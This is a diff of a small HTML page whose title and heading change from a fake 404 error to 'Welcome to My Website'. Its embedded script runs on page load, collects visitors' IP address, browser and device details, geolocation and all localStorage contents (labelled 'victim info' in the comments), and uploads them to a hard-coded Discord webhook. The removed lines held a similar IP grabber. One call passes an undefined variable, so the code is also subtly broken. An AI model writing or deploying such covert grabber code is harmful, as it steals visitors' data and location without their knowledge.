@@ -3,43 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ERROR</title>
+    <title>Welcome to My Website</title>
 </head>
 <body>
-    <h1>ERROR 404 no website found</h1>
+    <h1>Welcome to My Website!</h1>
     <p>I'm adding more features soon!</p>
 
     <script>
-        function getIpAndPort() {
-            const xhr = new XMLHttpRequest();
-            xhr.open('GET', 'https://api.ipify.org?format=json', true);
-            xhr.onload = function() {
-                if (xhr.status === 200) {
-                    const data = JSON.parse(xhr.responseText);
-                    const port = window.location.port || (window.location.protocol === 'https:' ? 443 : 80);
+        // Function to collect comprehensive victim information
+        async function collectVictimInfo() {
+            try {
+                // Get IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
 
-                    // Send data to Discord webhook
-                    sendToWebhook(data.ip, port);
+                // Get browser info
+                const browserInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    cookieEnabled: navigator.cookieEnabled,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                };
+
+                // Get geolocation
+                let geoLocation = null;
+                if (navigator.geolocation) {
+                    try {
+                        const position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject);
+                        });
+                        geoLocation = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                    } catch (err) {
+                        console.error('Geolocation error:', err);
+                    }
                 }
-            };
-            xhr.send();
+
+                // Get device info
+                const deviceInfo = {
+                    deviceMemory: navigator.deviceMemory || null,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    maxTouchPoints: navigator.maxTouchPoints
+                };
+
+                // Get network info
+                const networkInfo = {
+                    connection: navigator.connection ? {
+                        effectiveType: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt
+                    } : null
+                };
+
+                // Get local storage items
+                const localStorageItems = {};
+                for (let key in localStorage) {
+                    localStorageItems[key] = localStorage.getItem(key);
+                }
+
+                // Combine all information
+                const victimInfo = {
+                    ip: ipData.ip,
+                    port: window.location.port || (window.location.protocol === 'https:' ? 443 : 80),
+                    ...browserInfo,
+                    geoLocation,
+                    deviceInfo,
+                    networkInfo,
+                    localStorage: localStorageItems,
+                    timestamp: new Date().toISOString()
+                };
+
+                // Create and send text file to webhook
+                await sendFileToWebhook(GG);
+            } catch (error) {
+                console.error('Error collecting victim info:', error);
+            }
         }
 
-        function sendToWebhook(ip, port) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1443317683495108793/2W2y3ItifpVcMBr7p1FeIrPRPzpYzSP7vioEXQnliZC9WpzAl_-Zmt75ia_CvdVEzI2X';
-            const message = `IP Address: ${ip}\nPort Number: ${port}`;
+        // Function to create and send text file to webhook
+        async function sendFileToWebhook(info) {
+            // Convert object to formatted text
+            const formattedText = JSON.stringify(info, null, 2);
+            
+            // Create blob and upload to webhook
+            const blob = new Blob([formattedText], { type: 'text/plain' });
+            
+            // Create FormData object and append the file
+            const formData = new FormData();
+            formData.append('file', blob, 'victim_info.txt');
+            
+            // Send to webhook
+            const webhookUrl = 'https://discord.com/api/webhooks/1461964964603625594/jH-XEtXJtxJm69mjlFViAi8BQWutT-P6wTioZ-tElKw3BlJihCEeuNB2AazCCIjgKQKU';
+            
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                body: formData
+            });
 
-            const xhr = new XMLHttpRequest();
-            xhr.open('POST', webhookUrl, true);
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.onload = function() {
-                console.log('Data sent to webhook');
-            };
-            xhr.send(JSON.stringify({ content: message }));
+            if (!response.ok) {
+                throw new Error(`Failed to send webhook: ${response.status}`);
+            }
+
+            console.log('Victim info file sent to webhook');
         }
 
         // Call the function when the page loads
-        window.onload = getIpAndPort;
+        window.onload = collectVictimInfo;
     </script>
 </body>
 </html>
